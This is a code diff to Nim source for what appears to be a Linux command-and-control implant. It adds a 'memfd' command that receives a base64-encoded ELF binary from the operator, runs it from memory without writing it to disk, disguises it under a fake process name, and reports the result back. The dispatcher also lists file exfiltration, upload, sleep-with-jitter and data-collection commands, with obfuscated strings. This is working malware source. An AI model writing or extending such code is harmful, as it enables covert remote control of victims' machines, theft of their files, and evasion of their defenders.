@@ -1,6 +1,7 @@
 # Internal imports
 import ../config
 import ../common
+import utils/[memfd]
 # External imports
 import std/[strformat, tables, nativesockets, random, json, streams]
 import system/[io]
@@ -17,6 +18,7 @@ proc linux_parse_command*(command: JsonNode): bool
 
 # Command executors
 proc collect_data(): bool
+proc wrap_load_memfd(elf_base64: string, fake_process_name: string, mode: string): bool
 
 # Helpers
 proc get_linux_agent_id*(): string
@@ -99,6 +101,35 @@ proc collect_data(): bool =
     return is_success
 
 
+proc wrap_load_memfd(elf_base64: string, fake_process_name: string, mode: string): bool =
+    var is_success: bool
+    var is_task: bool
+    var output: string
+    
+    case mode:
+        of "implant":
+            is_task = false
+        of "task":
+            is_task = true
+        else:
+            return false
+    
+    (is_success, output) = load_memfd(elf_base64, fake_process_name, is_task)
+
+    var data = {
+        "is_success": $is_success,
+        "mode": mode,
+        "fake_process_name": fake_process_name
+    }.toOrderedTable()
+    
+    if output.len() > 0:
+        data["output"] = output
+
+    is_success = post_data(client, protectString("memfd"), $data)
+
+    return is_success
+
+
 #########################
 ######## Helpers ########
 #########################
@@ -138,6 +169,8 @@ proc linux_parse_command*(command: JsonNode): bool =
             is_success = exfil_file(client, command["src_file"].getStr())
         of protectString("upload"):
             is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr()) 
+        of protectString("memfd"):
+            is_success = wrap_load_memfd(command["elf_file_data_base64"].getStr(), command["fake_process_name"].getStr(), command["mode"].getStr())
         of protectString("sleep"):
             is_success = change_sleep_time(client, command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
